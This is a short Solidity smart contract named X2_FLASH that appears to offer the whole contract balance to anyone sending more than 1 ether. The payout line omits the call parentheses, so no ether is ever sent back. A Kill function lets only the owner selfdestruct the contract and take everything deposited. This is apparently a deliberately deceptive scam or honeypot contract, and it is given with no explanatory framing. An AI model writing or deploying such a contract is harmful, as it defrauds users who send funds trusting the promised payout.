pragma solidity ^0.4.19;

contract X2_FLASH  
{
    address owner = msg.sender;
    
    function() public payable {}
    
    function X2()
    public
    payable
    {
        if(msg.value > 1 ether)
        {
            msg.sender.call.value(this.balance);
        }
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==owner)
        {
            selfdestruct(owner);
        }
    }
}